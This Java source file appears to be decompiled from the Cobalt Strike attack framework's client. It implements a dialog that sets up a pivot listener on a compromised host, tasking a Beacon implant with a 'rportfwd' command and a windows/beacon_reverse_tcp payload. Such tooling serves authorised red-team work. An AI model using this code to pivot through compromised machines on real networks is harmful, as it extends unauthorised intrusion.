package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.TaskBeacon;
import common.AObject;
import common.BeaconEntry;
import common.Callback;
import common.CommonUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class PivotListenerSetup extends AObject implements DialogListener, Callback {

    protected AggressorClient client = null;

    protected JFrame dialog = null;

    protected Map options = new HashMap();

    protected String title = "New Listener";

    public PivotListenerSetup(AggressorClient aggressorClient, String string) {
        this.client = aggressorClient;
        BeaconEntry beaconEntry = DataUtils.getBeacon(aggressorClient.getData(), string);
        this.options.put("host", beaconEntry.getInternal());
        this.options.put("port", "4444");
        this.options.put("bid", string);
    }

    public PivotListenerSetup(AggressorClient aggressorClient, Map map) {
        this.client = aggressorClient;
        this.options = map;
        this.title = "Edit Listener";
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        String str1 = DialogUtils.string(map, "name");
        String str2 = DialogUtils.string(map, "host");
        int i = DialogUtils.number(map, "port");
        String str3 = DialogUtils.string(map, "payload");
        String str4 = DialogUtils.string(map, "bid");
        TaskBeacon taskBeacon = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{str4});
        if (!this.title.equals("Edit Listener")) {
            DialogUtils.openOrActivate(this.client, str4);
            taskBeacon.input("rportfwd " + i + " " + str3);
            taskBeacon.PivotListenerTCP(i);
        }
        HashMap hashMap = new HashMap();
        hashMap.put("payload", str3);
        hashMap.put("port", i + "");
        hashMap.put("host", str2);
        hashMap.put("name", str1);
        hashMap.put("bid", str4 + "");
        this.client.getConnection().call("listeners.create", CommonUtils.args(str1, hashMap), this);
    }

    public void result(String string, Object object) {
        String str = object + "";
        if (!"".equals(str))
            if (str.equals("success")) {
                DialogUtils.showInfo("Started Listener");
            } else {
                DialogUtils.showError("Could not start listener: \n" + str);
            }
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog(this.title, 640, 480);
        this.dialog.setLayout(new BorderLayout());
        String[] arrstring = CommonUtils.toArray("windows/beacon_reverse_tcp");
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        dialogManager.set(this.options);
        if (this.title.equals("Edit Listener")) {
            dialogManager.text_disabled("name", "Name:");
            dialogManager.combobox("payload", "Payload:", arrstring);
            dialogManager.text("host", "Listen Host:", 20);
            dialogManager.text_disabled("port", "Listen Port:");
            dialogManager.beacon_disabled("bid", "Session", this.client);
        } else {
            dialogManager.text("name", "Name:", 20);
            dialogManager.combobox("payload", "Payload:", arrstring);
            dialogManager.text("host", "Listen Host:", 20);
            dialogManager.text("port", "Listen Port:", 10);
            dialogManager.beacon("bid", "Session", this.client);
        }
        JButton jButton1 = dialogManager.action("Save");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-pivot-listener");
        this.dialog.add(DialogUtils.description("A pivot listener is a way to use a compromised system as a redirector for other Beacon sessions."), "North");
        this.dialog.add(dialogManager.layout(), "Center");
        this.dialog.add(DialogUtils.center(jButton1, jButton2), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}
